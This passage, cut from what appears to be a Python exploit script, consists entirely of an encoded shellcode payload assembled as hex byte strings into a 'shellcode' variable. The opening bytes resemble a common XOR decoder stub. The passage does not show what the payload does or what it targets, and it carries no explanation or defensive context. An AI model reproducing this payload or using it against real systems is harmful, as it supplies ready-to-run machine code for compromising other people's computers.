...
shellcode += "\x33\xc9\x83\xe9\xa5\xe8\xff\xff\xff\xff\xc0"
shellcode += "\x5e\x81\x76\x0e\xc3\x8d\xae\x90\x83\xee\xfc"
shellcode += "\xe2\xf4\x3f\x65\x2c\x90\xc3\x8d\xce\x19\x26"
shellcode += "\xbc\x6e\xf4\x48\xdd\x9e\x1b\x91\x81\x25\xc2"
shellcode += "\xd7\x06\xdc\xb8\xcc\x3a\xe4\xb6\xf2\x72\x02"
shellcode += "\xac\xa2\xf1\xac\xbc\xe3\x4c\x61\x9d\xc2\x4a"
shellcode += "\x4c\x62\x91\xda\x25\xc2\xd3\x06\xe4\xac\x48"
shellcode += "\xc1\xbf\xe8\x20\xc5\xaf\x41\x92\x06\xf7\xb0"
shellcode += "\xc2\x5e\x25\xd9\xdb\x6e\x94\xd9\x48\xb9\x25"
shellcode += "\x91\x15\xbc\x51\x3c\x02\x42\xa3\x91\x04\xb5"
shellcode += "\x4e\xe5\x35\x8e\xd3\x68\xf8\xf0\x8a\xe5\x27"
shellcode += "\xd5\x25\xc8\xe7\x8c\x7d\xf6\x48\x81\xe5\x1b"
shellcode += "\x9b\x91\xaf\x43\x48\x89\x25\x91\x13\x04\xea"
shellcode += "\xb4\xe7\xd6\xf5\xf1\x9a\xd7\xff\x6f\x23\xd2"
shellcode += "\xf1\xca\x48\x9f\x45\x1d\x9e\xe5\x9d\xa2\xc3"
shellcode += "\x8d\xc6\xe7\xb0\xbf\xf1\xc4\xab\xc1\xd9\xb6"
shellcode += "\xc4\x04\x46\x6f\x13\x35\x3e\x91\xc3\x8d\x87"
shellcode += "\x54\x97\xdd\xc6\xb9\x43\xe6\xae\x6f\x16\xe7"
shellcode += "\xa4\xf8\xc9\x87\xa0\x99\xab\x8f\xae\x81\x9f"
shellcode += "\x04\x48\xc0\x93\xdd\xfe\xd0\x93\xcd\xfe\xf8"
shellcode += "\x29\x82\x71\x70\x3c\x58\x39\xfa\xd3\xdb\xf9"
shellcode += "\xf8\x5a\x28\xda\xf1\x3c\x58\x2b\x50\xb7\x87"
shellcode += "\x51\xde\xcb\xf8\x42\x78\xa4\x8d\xae\x90\xa9"
shellcode += "\x8d\xc4\x94\x95\xda\xc6\x92\x1a\x45\xf1\x6f"
shellcode += "\x16\x0e\x56\x90\xbd\xbb\x25\xa6\xa9\xcd\xc6"
shellcode += "\x90\xd3\x8d\xae\xc6\xa9\x8d\xc6\xc8\x67\xde"
shellcode += "\x4b\x6f\x16\x1e\xfd\xfa\xc3\xdb\xfd\xc7\xab"
shellcode += "\x8f\x77\x58\x9c\x72\x7b\x13\x3b\x8d\xd3\xb8"
shellcode += "\x9b\xe5\xae\xd0\xc3\x8d\xc4\x90\x93\xe5\xa5"
shellcode += "\xbf\xcc\xbd\x51\x45\x94\xe5\xdb\xfe\x8e\xec"
shellcode += "\x51\x45\x9d\xd3\x51\x9c\xe7\x82\x2b\xe0\x3c"
shellcode += "\x72\x51\x79\x58\x72\x51\x6f\xc2\x4e\x87\x56"
shellcode += "\xb6\x4c\x6d\x2b\x23\x90\x84\x9a\xab\x2b\x3b"
shellcode += "\x2d\x5e\x72\x7b\xac\xc5\xf1\xa4\x10\x38\x6d"
shellcode += "\xdb\x95\x78\xca\xbd\xe2\xac\xe7\xae\xc3\x3c"
shellcode += "\x58\xae\x90"
